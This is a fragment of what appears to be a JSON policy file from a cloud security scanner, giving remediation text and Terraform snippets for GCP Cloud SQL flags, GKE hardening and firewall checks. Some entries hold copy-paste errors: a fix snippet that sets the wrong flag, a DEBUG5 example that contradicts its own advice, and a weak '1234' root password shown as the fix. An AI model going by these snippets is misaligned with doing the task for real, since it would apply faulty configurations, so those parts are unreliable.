        "description": "GCP PostgreSQL instance database flag log_disconnections is disabled\nDescription\nEnabling the log_disconnections database flag logs the end of each session, including the session duration. PostgreSQL does not log session details by default, including duration and session end details. Enabling the log_disconnections database flag creates log entries at the end of each session, useful when troubleshooting issues and determining unusual activity across a time period. \nThe log_disconnections and log_connections work hand in hand and usually the pair would be enabled/disabled together. \nWe recommended you set the log_disconnections flag for a PostgreSQL instance to On.  \nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag log_disconnections from the drop-down menu, and set its value to On.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database Instances using the following command:\ngcloud sql instances list\nConfigure the log_disconnections database flag for every Cloud SQL PosgreSQL database instance using the below command:\ngcloud sql instances patch INSTANCE_NAME --database-flags log_disconnections=on\n\n\ud83d\udcd8NoteThis command will overwrite all previously set database flags. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime\nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"POSTGRES* \"\nsettings::database_flags: key:\"log_disconnections\", value:  by default set to \"off\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"log_disconnections\"\n+            value = \"on\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_54": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_5",
        "description": "GCP PostgreSQL instance database flag log_lock_waits is disabled\nDescription\nDeadlock timeout defines the time to wait on a lock before checking for any conditions. Frequent runovers on deadlock timeout can be an indication of an underlying issue. Log these waits on locks using the log_lock_waits database flag and use the information to identify poor performance due to locking delays, or if a specially-crafted SQL is attempting to starve resources through holding locks for excessive amounts of time. \nWe recommended you set the log_lock_waits flag for a PostgreSQL instance to On.  This will create a log for any session and allow you to identify waits that take longer than the allotted deadlock_timeout time to acquire a lock.\nFix - Runtime Remediation\nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag log_lock_waits from the drop-down menu, and set its value to On.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database instances using the following command:\ngcloud sql instances list\nConfigure the log_lock_waits database flag for every Cloud SQL PosgreSQL database instance using the below command:\ngcloud sql instances patch INSTANCE_NAME --database-flags log_lock_waits=on\n\n\ud83d\udcd8NoteThis command will overwrite all database flags previously set. To keep these flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime \nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"POSTGRES* \"\nsettings::database_flags: key:\"log_lock_waits\", value:  by default set to \"off\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"log_lock_waits\"\n+            value = \"on\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_55": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_6",
        "description": "GCP PostgreSQL instance database flag log_min_messages is not set\nDescription\nThe log_min_error_statement database flag defines the minimum message severity level that is considered to be an error statement. Messages for error statements are logged with the SQL statement. Valid values include: DEBUG5, DEBUG4, DEBUG3, DEBUG2, DEBUG1, INFO, NOTICE, WARNING, ERROR, LOG, FATAL, and PANIC. Each severity level includes subsequent levels.\nDeadlock timeout defines the time to wait on a lock before checking for any conditions. Frequent runovers on deadlock timeout can be an indication of an underlying issue. Log these waits on locks using the log_lock_waits database flag and use the information to identify poor performance due to locking delays, or if a specially-crafted SQL is attempting to starve resources through holding locks for excessive amounts of time. \nWe recommend you set the log_min_error_statement flag for PostgreSQL database instances in accordance with your organization's logging policy for auditing purposes. Auditing helps you troubleshoot operational problems, and also permits forensic analysis. If log_min_error_statement is not set to the correct value, messages may not be classified as error messages appropriately. Considering general log messages as error messages would make it difficult to find actual errors, while considering only stricter severity levels as error messages may skip actual errors to log their SQL statements. \n\ud83d\udcd8NoteTo effectively turn off logging failing statements, set this parameter to PANIC.\nERROR is considered the best practice setting.\nChanges should only be made in accordance with the organization's logging policy.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag log_min_error_statement from the drop-down menu, and set an appropriate value.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database Instances using the following command:\ngcloud sql instances list\nConfigure the log_min_error_statement database flag for every Cloud SQL PosgreSQL database instance using the below command.\ngcloud sql instances patch INSTANCE_NAME --database-flags log_min_error_statement=<DEBUG5|DEBUG4|DEBUG3|DEBUG2|DEBUG1|INFO|NOTICE|WARNI NG|ERROR|LOG|FATAL|PANIC>\n\n\ud83d\udcd8NoteThis command will overwrite all database flags previously set. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime\nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"POSTGRES* \"\nsettings::database_flags: key:\"log_min_messages\", value:  by default set to \"ERROR\"\nArgument value can be one of the following: DEBUG5, DEBUG4, DEBUG3, DEBUG2, DEBUG1, INFO, NOTICE, WARNING, ERROR, LOG, FATAL, and PANIC\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"log_min_messages\"\n+            value = \"DEBUG5\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_56": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_7",
        "description": "GCP PostgreSQL instance database flag log_temp_files is not set to 0\nDescription\nPostgreSQL can create a temporary file for actions such as sorting, hashing and temporary query results when these operations exceed work_mem. The log_temp_files flag controls logging names and the file size when it is deleted. Configuring log_temp_files to zero (0) causes all temporary file information to be logged, while positive values log only files whose size are greater than or equal to the specified number of kilobytes. A value of -1 disables temporary file information logging.\nWe recommend you set the log_temp_files database flag for Cloud SQL PostgreSQL instances is set to zero (0). If temporary files are not logged, it may be difficult to identify potential performance issues caused by either poor application coding, or deliberate resource starvation attempts.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag log_temp_files from the drop-down menu, and set its value to 0.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database instances using the following command:\ngcloud sql instances list\nConfigure the log_temp_files database flag for every Cloud SQL PosgreSQL database instance using the below command.\ngcloud sql instances patch INSTANCE_NAME --database-flags log_temp_files=0``\nNote: This command will overwrite all database flags previously set. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (\"=\").\n\nFix - Buildtime \nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"POSTGRES* \"\nsettings::database_flags: key:\"log_temp_files\", value:  by default set to \"-1\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"log_temp_files\"\n+            value = \"0\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_57": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_8",
        "description": "GCP PostgreSQL instance database flag log_min_duration_statement is not set to -1\nDescription\nLogging SQL statements may include sensitive information that should not be recorded in logs. This recommendation is applicable to PostgreSQL database instances. The log_min_duration_statement database flag defines the minimum amount of execution time in milliseconds of a statement where the total duration of the statement is logged. \nWe recommend you ensure the log_min_duration_statement database flag for Cloud SQL PostgreSQL instances is disabled. To achieve this, set the value to -1.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag og_min_duration_statement from the drop-down menu, and set its value to -1.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database instances using the following command:\ngcloud sql instances list\nConfigure the log_min_duration_statement flag for every Cloud SQL PosgreSQL database instance using the below command:\ngcloud sql instances patch INSTANCE_NAME --database-flags log_min_duration_statement=-1\n\n\ud83d\udcd8NoteThis command will overwrite all database flags previously set. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime\nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"POSTGRES* \"\nsettings::database_flags: key:\"log_min_duration_statement\", value:  by default set to -1\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"POSTGRES_11\"\n  region           = \"us-central1\"\n\n  settings {\n+         database_flags {\n+            name  = \"log_min_duration_statement\"\n+            value = \"-1\"\n          }\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_58": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_9",
        "description": "Cloud SQL SQL server instance database flag cross db ownership chaining is set to On\nDescription\nUse the cross db ownership chaining database flag to configure cross-database ownership chaining for an instance of Microsoft SQL Server. This server option allows you to control cross-database ownership chaining at database-level, or to allow cross-database ownership chaining for all databases. \nWe recommend you disable the cross db ownership chaining flag for Cloud SQL SQL Server instances, by setting it to Off. Enabling cross db ownership chaining is only effective when all of the databases hosted by the instance of SQL Server participate in cross-database ownership chaining, and you are aware of the security implications of this setting.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag cross db ownership chaining from the drop-down menu, and set its value to Off.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database instances using the following command:\ngcloud sql instances list\nConfigure the cross db ownership chaining database flag for every Cloud SQL SQL Server database instance using the below command:\n\ngcloud sql instances patch INSTANCE_NAME \n--database-flags \"cross db ownership chaining=off\"\n\n\ud83d\udcd8NoteThis command will overwrite all database flags previously set. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime \nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"SQLSERVER* \"\nsettings::database_flags: key:\"cross db ownership chaining\", value:  by default set to \"on\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  region           = \"us-central1\"\n  \n  settings {\n+         database_flags {\n+            name  = \"cross db ownership chaining\"\"\n+            value = \"off\"\n          }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_59": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_sql_10",
        "description": "Cloud SQL SQL server instance contained database authentication database flag is set to On\nDescription\nA contained database includes all database settings and metadata required to define the database. It has no configuration dependencies on the instance of the Database Engine where the database is installed. Users can connect to the database without authenticating a login at the Database Engine level. Isolating the database from the Database Engine makes it possible to easily move the database to another instance of SQL Server. Contained databases have some unique threats that should be understood and mitigated by SQL Server Database Engine administrators. Most of the threats are related to the USER WITH PASSWORD authentication process, which moves the authentication boundary from the Database Engine level to the database level, \nWe recommend you ensure the contained database authentication database flag for SQL Server database instances is disabled. To achieve this, set the value to Off.\nFix - Runtime \nGCP Console\nTo change the policy using the GCP Console, follow these steps:\n\nLog in to the GCP Console at https://console.cloud.google.com.\nNavigate to Cloud SQL Instances.\nSelect the PostgreSQL instance where the database flag needs to be enabled.\nClick Edit.\nScroll down to the Flags section.\nTo set a flag that has not been set on the instance before, click Add item.\nSelect the flag contained database authentication from the drop-down menu, and set its value to Off.\nClick Save.\nConfirm the changes in the Flags section on the Overview page.\n\nCLI Command\n\nList all Cloud SQL database Instances using the following command:\ngcloud sql instances list\nConfigure the contained database authentication database flag for every Cloud SQL SQL Server database instance using the below command:\n\ngcloud sql instances patch INSTANCE_NAME \n--database-flags \"contained database authentication=off\"\n\n\ud83d\udcd8NoteThis command will overwrite all database flags previously set. To keep these flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (=).\nFix - Buildtime \nTerraform\n\nResource: google_sql_database_instance\nArguments:\ndatabaseversion = \"SQLSERVER* \"\nsettings::database_flags: key:\"contained database authentication\", value:  by default set to \"on\"\n\nGoresource \"google_sql_database_instance\" \"default\" {\n  name             = \"master-instance\"\n  database_version = \"SQLSERVER_2017_STANDARD\"\n  region           = \"us-central1\"\n  \n  settings {\n+         database_flags {\n+            name  = \"cross db ownership chaining\"\"\n+            value = \"off\"\n          }\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_62": {
        "url": "https://docs.bridgecrew.io/docs/bc_gcp_logging_2",
        "description": "Bucket does not log access\nDescription\nSome resources  require a record of who access them and when.\nFix - Buildtime \nTerraform\n\nResource: google_storage_bucket\nArgument: logging/log_bucket to specify a Bucket to store access log in.\n\nGoresource \"google_storage_bucket\" \"logging\" {\n  name     = \"jgwloggingbucket\"\n  location = var.location\n  uniform_bucket_level_access = true\n+  logging {\n+    log_bucket = \"mylovelybucket\"\n+  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_61": {
        "url": "https://docs.bridgecrew.io/docs/enable-vpc-flow-logs-and-intranode-visibility",
        "description": "VPC flow logs and intranode visibility are disabled\nDescription\nEnable VPC Flow Logs and Intranode Visibility to see pod-level traffic, even for traffic within a worker node. With this feature, you can use VPC Flow Logs or other VPC features for intranode traffic.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster\nArgument: enable_intranode_visibility\n\nGoresource \"google_container_cluster\" \"example\" {\n  name               = var.name\n  location           = var.location\n  project            = data.google_project.project.name\n+ enable_intranode_visibility = true\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_66": {
        "url": "https://docs.bridgecrew.io/docs/ensure-use-of-binary-authorization",
        "description": "Binary authorization is not used\nDescription\nBinary Authorization helps to protect supply-chain security by only allowing images with verifiable cryptographically signed metadata into the cluster.\nBinary Authorization provides software supply-chain security for images that you deploy to GKE from Google Container Registry (GCR) or another container image registry.\nBinary Authorization requires images to be signed by trusted authorities during the development process. These signatures are then validated at deployment time. By enforcing validation, you can gain tighter control over your container environment by ensuring only verified images are integrated into the build-and-release process.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster\nArgument: enable_binary_authorization\n\nGoresource \"google_container_cluster\" \"success\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n+ enable_binary_authorization = true\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_68": {
        "url": "https://docs.bridgecrew.io/docs/ensure-secure-boot-for-shielded-gke-nodes-is-enabled",
        "description": "Secure boot for shielded GKE nodes is disabled\nDescription\nEnable Secure Boot for Shielded GKE Nodes to verify the digital signature of node boot components.\nAn attacker may seek to alter boot components to persist malware or root kits during system initialization. Secure Boot helps ensure that the system only runs authentic software by verifying the digital signature of all boot components, and halting the boot process if signature verification fails.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster / google_container_node_pool\nArgument: node_config.shielded_instance_config.enable_secure_boot\n\nGoresource \"google_container_cluster\" \"success\" {\n  name               = var.name\n  \n  ...\n  node_config {\n    workload_metadata_config {\n      node_metadata = \"GKE_METADATA_SERVER\"\n    }\n    shielded_instance_config {\n-     enable_secure_boot = false\n    }\n  }\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_64": {
        "url": "https://docs.bridgecrew.io/docs/ensure-clusters-are-created-with-private-nodes",
        "description": "GCP Kubernetes Engine Clusters not configured with private nodes feature \nDescription\nDisable public IP addresses for cluster nodes, so that they only have private IP addresses. Private Nodes are nodes with no public IP addresses.\nDisabling public IP addresses on cluster nodes restricts access to only internal networks, forcing attackers to obtain local network access before attempting to compromise the underlying Kubernetes hosts.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster\nArgument: private_cluster_config\n\nGoresource \"google_container_cluster\" \"example\" {\n  name               = var.name\n  location           = var.location\n  project            = data.google_project.project.name\n\n+ private_cluster_config {\n+   enable_private_nodes    = var.private_cluster_config[\"enable_private_nodes\"]\n+   enable_private_endpoint = var.private_cluster_config[\"enable_private_endpoint\"]\n+   master_ipv4_cidr_block  = var.private_cluster_config[\"master_ipv4_cidr_block\"]\n+ }\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_65": {
        "url": "https://docs.bridgecrew.io/docs/manage-kubernetes-rbac-users-with-google-groups-for-gke",
        "description": "Kubernetes RBAC users are not managed with Google Groups for GKE\nDescription\nCluster Administrators should leverage G Suite Groups and Cloud IAM to assign Kubernetes user roles to a collection of users, instead of to individual emails using only Cloud IAM.\nOn- and off-boarding users is often difficult to automate and prone to error. Using a single source of truth for user permissions via G Suite Groups reduces the number of locations that an individual must be off-boarded from, and prevents users gaining unique permissions sets that increase the cost of audit.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster\nArgument: authenticator_groups_config.security_group\n\nGoresource \"google_container_cluster\" \"example\" {\n  name               = var.name\n  location           = var.location\n  project            = data.google_project.project.name\n  \n+ authenticator_groups_config{\n+   security_group=\"[email\u00a0protected]\"\n+ }\n",
        "severity": "LOW"
    },
    "CKV_GCP_67": {
        "url": "https://docs.bridgecrew.io/docs/ensure-legacy-compute-engine-instance-metadata-apis-are-disabled",
        "description": "GCP Kubernetes engine clusters have legacy compute engine metadata endpoints enabled\nDescription\nDisable the legacy GCE instance metadata APIs for GKE nodes. Under some circumstances, these can be used from within a pod to extract the node's credentials.\nThe legacy GCE metadata endpoint allows simple HTTP requests to be made returning sensitive information. To prevent the enumeration of metadata endpoints and data exfiltration, the legacy metadata endpoint must be disabled.\nWithout requiring a custom HTTP header when accessing the legacy GCE metadata endpoint, a flaw in an application that allows an attacker to trick the code into retrieving the contents of an attacker-specified web URL could provide a simple method for enumeration and potential credential exfiltration. By requiring a custom HTTP header, the attacker needs to exploit an application flaw that allows them to control the URL and also add custom headers in order to carry out this attack successfully.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster\nArgument: min_master_version\n\nGoresource \"google_container_cluster\" \"example\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n+ min_master_version = 1.12 // (or higher)\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_69": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-gke-metadata-server-is-enabled",
        "description": "The GKE metadata server is disabled\nDescription\nRunning the GKE Metadata Server prevents workloads from accessing sensitive instance metadata and facilitates Workload Identity.\nEvery node stores its metadata on a metadata server. Some of this metadata, such as kubelet credentials and the VM instance identity token, is sensitive and should not be exposed to a Kubernetes workload. Enabling the GKE Metadata server prevents pods (that are not running on the host network) from accessing this metadata and facilitates Workload Identity.\nWhen unspecified, the default setting allows running pods to have full access to the node's underlying metadata server.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster / google_container_node_pool\nArgument: node_config.workload_metadata_config.node_metadata\n\nGoresource \"google_container_cluster\" \"example\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n+ node_config {\n+   workload_metadata_config {\n+     node_metadata = \"GKE_METADATA_SERVER\"\n+   }\n+ }\n  \n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_71": {
        "url": "https://docs.bridgecrew.io/docs/ensure-shielded-gke-nodes-are-enabled",
        "description": "Shielded GKE nodes are not enabled\nDescription\nShielded GKE Nodes provides verifiable integrity via secure boot, virtual trusted platform module (vTPM)-enabled measured boot, and integrity monitoring.\nShielded GKE nodes protects clusters against boot- or kernel-level malware or rootkits which persist beyond infected OS.\nShielded GKE nodes run firmware which is signed and verified using Google's Certificate Authority, ensuring that the nodes' firmware is unmodified and establishing the root of trust for Secure Boot. GKE node identity is strongly protected via virtual Trusted Platform Module (vTPM) and verified remotely by the master node before the node joins the cluster. Lastly, GKE node integrity (i.e., boot sequence and kernel) is measured and can be monitored and verified remotely.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster\nArgument: enable_shielded_nodes\n\nGoresource \"google_container_cluster\" \"success\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n+ enable_shielded_nodes = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_72": {
        "url": "https://docs.bridgecrew.io/docs/ensure-integrity-monitoring-for-shielded-gke-nodes-is-enabled",
        "description": "Integrity monitoring for shielded GKE nodes is not enabled\nDescription\nEnable Integrity Monitoring for Shielded GKE Nodes to be notified of inconsistencies during the node boot sequence.\nIntegrity Monitoring provides active alerting for Shielded GKE nodes which allows administrators to respond to integrity failures and prevent compromised nodes from being deployed into the cluster.\nFix - Buildtime \nTerraform\n\nResource: google_container_cluster / google_container_node_pool\nArgument: node_config.shielded_instance_config.enable_integrity_monitoring\n\nGoresource \"google_container_cluster\" \"fail\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  node_config {\n\n    shielded_instance_config {\n-     enable_integrity_monitoring = false\n    }\n  }\n",
        "severity": "MEDIUM"
    },
    "CKV2_GCP_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gke-clusters-are-not-running-using-the-compute-engine-default-service-account",
        "description": "Kubernetes engine cluster nodes have default service account for project access\nDescription\nCreate and use minimally privileged Service accounts to run GKE cluster nodes instead of using the Compute Engine default Service account. Unnecessary permissions could be abused in the case of a node compromise.\nA GCP service account (as distinct from a Kubernetes ServiceAccount) is an identity that an instance or an application can use to run GCP API requests on your behalf. This identity is used to identify virtual machine instances to other Google Cloud Platform services. By default, Kubernetes Engine nodes use the Compute Engine default service account. This account has broad access by default, as defined by access scopes, making it useful to a wide variety of applications on the VM, but it has more permissions than are required to run your Kubernetes Engine cluster.\nYou should create and use a minimally privileged service account to run your Kubernetes Engine cluster instead of using the Compute Engine default service account, and create separate service accounts for each Kubernetes Workload (See Recommendation 6.2.2).\nKubernetes Engine requires, at a minimum, the node service account to have the monitoring.viewer, monitoring.metricWriter, and logging.logWriter roles. Additional roles may need to be added for the nodes to pull images from GCR.\nFix - Buildtime \nTerraform\n\nResource: google_container_node_pool / google_container_cluster\nArgument: google_project_default_service_accounts\n\nGoresource \"google_project_default_service_accounts\" \"not_ok\" {\n  project = \"my-project-id\"\n  action = \"DELETE\"\n  id=\"1234\"\n}\n\nresource \"google_container_node_pool\" \"primary_A_not_ok\" {\n  name       = \"my-node-pool\"\n  ...\n\n  -   service_account = google_project_default_service_accounts.not_ok.id\n    oauth_scopes    = [\n      \"https://www.googleapis.com/auth/cloud-platform\"\n    ]\n  }\n}\n\nresource \"google_container_cluster\" \"primary_B_not_ok\" {\n  \n  ...\n  node_config {\n-   service_account = google_project_default_service_accounts.not_ok.id\n    oauth_scopes = [\n      \"https://www.googleapis.com/auth/cloud-platform\"\n    ]\n  }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GCP_70": {
        "url": "https://docs.bridgecrew.io/docs/ensure-the-gke-release-channel-is-set",
        "description": "Kubernetes Engine cluster not using Release Channel for version management\nDescription\nThe release channels allow organizations to better set their expectation of what is stable. GKE\u2019s release channel options include \u201crapid,\u201d \u201cregular,\u201d and \u201cstable.\u201d This allows you to opt for the alpha releases as part of the \u201crapid\u201d option, \u201cregular\u201d for standard release needs and \u201cstable\u201d when the tried-and-tested version becomes available.\nFix - Buildtime\nTerraform\nGoresource \"google_container_cluster\" \"success\" {\n  name               = var.name\n  location           = var.location\n  initial_node_count = 1\n  project            = data.google_project.project.name\n\n  network    = var.network\n  subnetwork = var.subnetwork\n\n  ip_allocation_policy {\n    cluster_ipv4_cidr_block       = var.ip_allocation_policy[\"cluster_ipv4_cidr_block\"]\n    cluster_secondary_range_name  = var.ip_allocation_policy[\"cluster_secondary_range_name\"]\n    services_ipv4_cidr_block      = var.ip_allocation_policy[\"services_ipv4_cidr_block\"]\n    services_secondary_range_name = var.ip_allocation_policy[\"services_secondary_range_name\"]\n  }\n\n  node_config {\n    workload_metadata_config {\n      node_metadata = \"GKE_METADATA_SERVER\"\n    }\n  }\n\n  release_channel {\n    channel = var.release_channel\n  }\n\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_GCP_12": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-google-compute-firewall-ingress-does-not-allow-unrestricted-access-to-all-ports",
        "description": "GCP Firewall with Inbound rule overly permissive to All Traffic\nDescription\nThis policy identifies GCP Firewall rules which allows inbound traffic on all protocols from public internet. Doing so, may allow a bad actor to brute force their way into the system and potentially get access to the entire network.\nFix - Runtime\nFix - Buildtime\nTerraform\nGo# pass\nresource \"google_compute_firewall\" \"compute-firewall-ok-1\" {\n  name    = \"compute-firewall-ok-1\"\n  network = google_compute_network.example.name\n\n  deny {\n    protocol = \"all\"\n  }\n  source_ranges = [\"0.0.0.0/0\"]\n  disabled = false\n}\n",
        "severity": "HIGH"
    },
    "CKV2_GCP_7": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-a-mysql-database-instance-does-not-allow-anyone-to-connect-with-administrative-privileges",
        "description": "A MySQL database instance allows anyone to connect with administrative privileges\nDescription\nIt is recommended to set a password for the administrative user (root by default) to prevent unauthorized access to the SQL database instances.\nThis recommendation is applicable only for MySQL Instances. PostgreSQL does not offer any setting for No Password from the cloud console.\nAt the time of MySQL Instance creation, not providing an administrative password allows anyone to connect to the SQL database instance with administrative privileges. The root password should be set to ensure only authorized users have these privileges.\nFix - Buildtime \nTerraform\n\nResource: google_sql_database_instance\nArgument: google_sql_user\n\nGoresource \"google_sql_user\" \"root_with_password\" {\n  name     = \"root\"\n  instance = google_sql_database_instance.db_instance.name\n  host     = \"me.com\"\n+ password = \"1234\"\n}\n",
        "severity": "LOW"
    },
    "CKV2_GCP_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-there-are-only-gcp-managed-service-account-keys-for-each-service-account",
        "description": "There are not only GCP-managed service account keys for each service account\nDescription\nAnyone who has access to the keys will be able to access resources through the service account. GCP-managed keys are used by Cloud Platform services such as App Engine and Compute Engine. These keys cannot be downloaded. Google will keep the keys and automatically rotate them on an approximately weekly basis. User-managed keys are created, downloadable, and managed by users. They expire 10 years from creation.\nFor user-managed keys, the user has to take ownership of key management activities which include:\n\nKey storage\nKey distribution\nKey revocation\nKey rotation\nProtecting the keys from unauthorized users\nKey recovery\nEven with key owner precautions, keys can be easily leaked by common development malpractices like checking keys into the source code or leaving them in the Downloads directory, or accidentally leaving them on support blogs/channels.\nWe recommended you prevent user-managed service account keys.\n\nFix - Buildtime \nTerraform\n\nResource: google_service_account, google_service_account_key\nArgument: service_account_id\n\nGoresource \"google_service_account\" \"account_ok\" {\n  account_id = \"dev-foo-account\"\n}\n\nresource \"google_service_account_key\" \"ok_key\" {\n  service_account_id = google_service_account.account_ok.name\n}\n",
        "severity": "LOW"
    },
    "CKV_GCP_CUSTOM_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-gcp-resources-that-suppot-labels-have-labels",
